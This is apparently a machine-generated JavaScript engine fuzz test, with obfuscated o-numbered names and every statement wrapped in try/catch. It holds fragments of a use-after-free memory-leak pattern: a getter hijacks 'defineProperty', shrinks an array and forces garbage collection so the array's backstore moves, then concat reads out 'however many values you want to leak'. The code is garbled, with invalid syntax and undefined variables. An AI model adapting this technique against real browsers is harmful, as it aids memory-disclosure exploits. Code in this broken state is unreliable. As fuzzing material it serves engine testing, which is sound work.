var o35 = { writable: false, value: 1, configurable: false, enumerable: false };
var o30;

class o2 extends Array {
                static o24() { try {
'use strict';
}catch(e){} }
            }

var o867[o768 | 5] = +o1049.NaN;
try {
o259[10724 >> 2] = 0.1;
}catch(e){}
try {
o177 = o7.o15(function() { try {
o3.arguments = 'something';
}catch(e){} }, name + " has 'arguments' property which  can't be assigned to");
}catch(e){}

var o44 = o62()

function o7() {
    try {
o3.length = 1;
}catch(e){} // shorten the array so the backstore pointer is relocated
    try {
o4();
}catch(e){}         // force gc to move the array's elements backstore
    try {
return o1;
}catch(e){}
}

try {
Object.prototype.__defineGetter__("defineProperty", o7);
}catch(e){}

var o8 = Array.prototype.concat.call(o3);

try {
for (var o5 = 0; o5 < 20; o5++) { // however many values you want to leak
    try {
o9.o10(o8[o5]);
}catch(e){}
}
}catch(e){}